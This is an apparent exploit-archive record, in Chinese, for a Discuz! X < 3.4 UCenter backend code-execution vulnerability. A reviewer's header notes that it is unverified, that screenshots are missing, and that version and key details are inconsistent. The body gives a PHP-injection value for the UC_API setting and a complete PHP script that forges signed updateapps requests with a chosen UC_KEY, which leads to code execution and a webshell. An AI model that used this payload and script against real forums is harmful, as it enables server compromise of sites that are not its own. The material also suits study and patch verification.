---
source: "hatch 补库批 20260928"
product: "Discuz X/UCenter"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Discuz! X < 3.4 uc_center 后台代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：<3.4 asserted but example pathdiscuz34; admin alters UC_KEY/UC_API then signed updateapps; config writable"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-9a767b00793131cb7125cce2"
entity_id: "ve-9a767b00793131cb7125cce2"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;3.4 asserted but example pathdiscuz34; admin alters UC_KEY/UC_API then signed updateapps; config writable

- **证据待核（1）**：All key request/output screenshots replaced with1.png–5.png; final API request absent。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（2）**：Prose uses keydz but generator123456; instruct exact matching placeholder。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：Changes integration key and can break UCenter communications; warning exists, preserve it。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：Complementary fuller flow to82, version discrepancy unresolved; no source。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz! X \< 3.4 uc\_center 后台代码执行漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Discuz! X \< 3.4

三、复现过程
------------

-   进入后台站长-Ucenter设置，设置UC\_KEY=随意(一定要记住，后面要用),

<!-- -->

    UC_API= http://www.0-sec.org/discuz34/uc_server');phpinfo();//

> **图片待核**：原归档在此处仅保留文件名 `1.png`，没有可对应的图片引用。

> **图片待核**：原归档在此处仅保留文件名 `2.png`，没有可对应的图片引用。

成功写进配置文件，这里单引号被转移了，我们接下来使用UC\_KEY(dz)去调用api/uc.php中的updateapps函数更新UC\_API。

利用UC\_KEY(dz) 生成code参数，使用过UC\_KEY(dz)
GetWebShell的同学肯定不陌生，这里使用的UC\_KEY(dz)就是上面我们设置的。

    <?php
    $uc_key="123456";//
    $time = time() + 720000;
    $str = "time=".$time."&action=updateapps";
    $code = authcode($str,"ENCODE",$uc_key);
    $code = str_replace('+','%2b',$code);
    $code = str_replace('/','%2f',$code);
    echo $code;

    function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
      $ckey_length = 4;
      $key = md5($key != '' ? $key : '123456');
      $keya = md5(substr($key, 0, 16));
      $keyb = md5(substr($key, 16, 16));
      $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

      $cryptkey = $keya.md5($keya.$keyc);
      $key_length = strlen($cryptkey);

      $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
      $string_length = strlen($string);

      $result = '';
      $box = range(0, 255);

      $rndkey = array();
      for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
      }

      for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
      }

      for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
      }

      if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
          return substr($result, 26);
        } else {
          return '';
        }
      } else {
        return $keyc.str_replace('=', '', base64_encode($result));
      }
    }
    ?>

-   将生成的数据带入GET请求中的code 参数，发送数据包    3.png

访问 http://www.0-sec.org/discuz34/config/config\_ucenter.php
代码执行成功4.png

> **图片待核**：原归档在此处仅保留文件名 `5.png`，没有可对应的图片引用。

到此成功GetWebShell，在这个过程中，有一点需要注意的是，我们修改了程序原有的UC\_KEY(dz)，成功GetWebShell以后一定要修复，有2中方法：

-   从数据库中读取authkey(uc\_server)，通过UC\_MYKEY解密获得UC\_KEY(dz)，当然有可能authkey(uc\_server)就是UC\_KEY(dz)。

-   直接进入Ucenter后台修改UC\_KEY，修改成我们GetWebShell过程中所设置的值。
